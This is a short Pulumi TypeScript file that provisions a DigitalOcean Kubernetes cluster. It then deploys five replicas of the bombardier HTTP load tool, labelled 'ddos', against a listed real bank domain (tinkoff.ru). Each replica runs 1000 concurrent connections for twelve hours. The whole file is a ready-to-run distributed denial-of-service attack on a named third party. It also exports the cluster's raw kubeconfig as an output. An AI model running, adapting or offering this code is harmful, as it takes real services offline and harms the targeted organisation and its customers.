import * as k8s from "@pulumi/kubernetes";
import * as digitalocean from "@pulumi/digitalocean";

const cluster = new digitalocean.KubernetesCluster("do-k8s", {
    region: digitalocean.Region.FRA1,
    version: digitalocean.getKubernetesVersions({versionPrefix: "1.21"}).then(p => p.latestVersion),
    nodePool: {
        name: "default",
        size: digitalocean.DropletSlug.DropletS1VCPU2GB,
        nodeCount: 3,
    },
    surgeUpgrade: false
  });

export const kubeconfig = cluster.kubeConfigs[0].rawConfig;


const provider = new k8s.Provider("do-k8s", { kubeconfig })

const tartgetsList = ["tinkoff.ru"]
tartgetsList.forEach((target, index) => {
const appLabels = { app: "ddos" };
const deployment = new k8s.apps.v1.Deployment(`ddos-${index}`, {
    spec: {
        selector: { matchLabels: appLabels },
        replicas: 5,
        template: {
            metadata: { labels: appLabels },
            spec: { containers: [{ name: "ddos", image: "alpine/bombardier", args: ["-c", "1000", "-d", "43200s", "-l", target]}] }
        }
    }
}, { provider });
});
